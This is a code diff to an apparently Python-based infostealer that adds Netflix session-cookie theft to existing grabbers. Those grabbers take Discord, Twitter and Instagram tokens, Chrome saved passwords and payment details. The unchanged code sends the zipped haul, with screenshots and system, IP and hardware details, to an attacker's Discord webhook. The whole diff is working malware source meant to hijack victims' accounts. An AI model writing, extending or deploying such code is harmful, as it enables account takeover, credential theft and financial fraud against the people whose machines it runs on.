@@ -26,7 +26,7 @@ from pyautogui import screenshot
 from random import choices
 from string import ascii_letters, digits
 
-website = ['discord.com', 'twitter.com', 'instagram.com']
+website = ['discord.com', 'twitter.com', 'instagram.com', 'netflix.com']
 
 def get_screenshot(path):
     get_screenshot.scrn = screenshot()
@@ -186,6 +186,16 @@ def main(dirpath):
             for x in insta_lst:
                 for y in x:
                     x[x.index(y)] = y[1]
+        elif w == website[3]:
+            n_cookies, n_lst = ([] for _ in range(2))
+            for b in cookies_grabber_mod(w):
+                n_cookies.append(b.split(', '))
+            for c in n_cookies:
+                for y in c:
+                    if search(r"NetflixId", y) != None:
+                        data = y.split(' ')[1].split("=")[1]
+                        if len(data) > 80:
+                            n_lst.append(data)
     all_data_p = []
     for x in tokens:
         lst_b = has_payment_methods(x)
@@ -202,7 +212,7 @@ def main(dirpath):
         except:
             pass
 
-    return [tokens, list(set(t_lst)), list(set(tuple(element) for element in insta_lst)), all_data_p, chrome_psw_list]
+    return [tokens, list(set(t_lst)), list(set(tuple(element) for element in insta_lst)), all_data_p, chrome_psw_list, list(set(n_lst))]
 
 def send_webhook(DISCORD_WEBHOOK_URLs):
     p_lst = get_Personal_data()
@@ -211,7 +221,7 @@ def send_webhook(DISCORD_WEBHOOK_URLs):
         SetFileAttributes(td, win32con.FILE_ATTRIBUTE_HIDDEN)
         get_screenshot(path=td)
         main_info = main(td)
-        discord_T, twitter_T, insta_T, chrome_Psw_t = (PrettyTable(padding_width=1) for _ in range(4))
+        discord_T, twitter_T, insta_T, chrome_Psw_t, net_T = (PrettyTable(padding_width=1) for _ in range(5))
         discord_T.field_names, twitter_T.field_names, insta_T.field_names, chrome_Psw_t.field_names, verified_tokens = ["Discord Tokens", "Username", "Email", "Phone"], ["Twitter Tokens [auth_token]"], ["ds_user_id", "sessionid"], ['Username / Email', 'password', 'website'], []
         for __t in main_info[4]:
             chrome_Psw_t.add_row(__t)
@@ -227,6 +237,8 @@ def send_webhook(DISCORD_WEBHOOK_URLs):
             twitter_T.add_row([_t])
         for _t_ in main_info[2]:
             insta_T.add_row(_t_)
+        for t__ in main_info[5]:
+            net_T.add_column(f"NetflixId ({main_info[5].index(t__)})", [t__])
         pay_l = []
         for _p in main_info[3]:
             if _p[1] == 1:
@@ -239,11 +251,15 @@ def send_webhook(DISCORD_WEBHOOK_URLs):
                 payment_p.field_names = ["Email", "Type", "Billing Adress"]
                 payment_p.add_row([_p[0], "Paypal", _p[2]])
                 pay_l.append(payment_p.get_string())
-        files_names = [[os.path.join(td, "Discord Tokens.txt"), discord_T], [os.path.join(td, "Twitter Tokens.txt"), twitter_T], [os.path.join(td, "Instagram Tokens.txt"), insta_T], [os.path.join(td, "Chrome Pass.txt"), chrome_Psw_t]]
+        files_names = [[os.path.join(td, "Discord Tokens.txt"), discord_T], [os.path.join(td, "Twitter Tokens.txt"), twitter_T], [os.path.join(td, "Instagram Tokens.txt"), insta_T], [os.path.join(td, "Chrome Pass.txt"), chrome_Psw_t], [os.path.join(td, "Netflix Tokens.html"), net_T]]
         for x_, y_ in files_names:
-            if (y_ == files_names[0][1] and len(main_info[0])!=0) or (y_ == files_names[1][1] and len(main_info[1])!=0) or (y_ == files_names[2][1] and len(main_info[2])!=0) or (y_ == files_names[3][1] and len(main_info[4])!=0):
+            if (y_ == files_names[0][1] and len(main_info[0])!=0) or (y_ == files_names[1][1] and len(main_info[1])!=0) or (y_ == files_names[2][1] and len(main_info[2])!=0) or (y_ == files_names[3][1] and len(main_info[4])!=0) or (y_ == files_names[4][1] and len(main_info[5])!=0):
                 with open(x_, 'w') as wr:
-                    wr.write(y_.get_string())
+                    if files_names[4][1] != y_:
+                        wr.write(y_.get_string())
+                    else:
+                        net_T.format = True
+                        wr.write(y_.get_html_string())
         with ZipFile(os.path.join(td, 'data.zip'), mode='w', compression=ZIP_DEFLATED) as zip:
             if ('payment_card' or 'payment_p') in locals():
                 with open(os.path.join(td, "Payment Info.txt"), 'w') as f:
@@ -263,7 +279,7 @@ def send_webhook(DISCORD_WEBHOOK_URLs):
             embed.add_embed_field(name='SYSTEM USER INFO', value=f":pushpin:`PC Username:` **{os.getenv('UserName')}**\n:computer:`PC Name:` **{os.getenv('COMPUTERNAME')}**\n:globe_with_meridians:`OS:` **{platform()}**\n", inline=False)
             embed.add_embed_field(name='IP USER INFO', value=f":eyes:`IP:` **{p_lst[0]}**\n:golf:`Country:` **{p_lst[1]}** :flag_{get(f'https://restcountries.com/v3/name/{p_lst[1]}').json()[0]['cca2'].lower()}:\n:cityscape:`City:` **{p_lst[2]}**\n:shield:`MAC:` **{gma()}**\n:wrench:`HWID:` **{get_hwid()}**\n", inline=False)
             embed.add_embed_field(name='PC USER COMPONENT', value=f":satellite_orbital:`CPU:` **{cpuinfo['brand_raw']} - {round(float(cpuinfo['hz_advertised_friendly'].split(' ')[0]), 2)} GHz**\n:nut_and_bolt:`RAM:` **{round(virtual_memory().total / (1024.0 ** 3), 2)} GB**\n:desktop:`Resolution:` **{GetSystemMetrics(0)}x{GetSystemMetrics(1)}**\n", inline=False)
-            embed.add_embed_field(name='ACCOUNT GRABBED', value=f":red_circle:`Discord:` **{len(verified_tokens)}**\n:purple_circle:`Twitter:` **{len(main_info[1])}**\n:blue_circle:`Instagram:` **{len(main_info[2])}**\n:brown_circle:`Account Password Grabbed:` **{len(main_info[4])}**\n", inline=False)
+            embed.add_embed_field(name='ACCOUNT GRABBED', value=f":red_circle:`Discord:` **{len(verified_tokens)}**\n:purple_circle:`Twitter:` **{len(main_info[1])}**\n:blue_circle:`Instagram:` **{len(main_info[2])}**\n:green_circle:`Netflix:` **{len(main_info[5])}**\n:brown_circle:`Account Password Grabbed:` **{len(main_info[4])}**\n", inline=False)
             card_e, paypal_e = ":white_check_mark:" if 'payment_card' in locals() else ":x:", ":white_check_mark:" if 'payment_p' in locals() else ":x:"
             embed.add_embed_field(name='PAYMENT INFO FOUNDED', value=f":credit_card:`Debit or Credit Card:` {card_e}\n:money_with_wings:`Paypal:` {paypal_e}", inline=False)
             embed.set_footer(text='By Lemon.-_-.#3714 & cr4sh3d.py#2160')
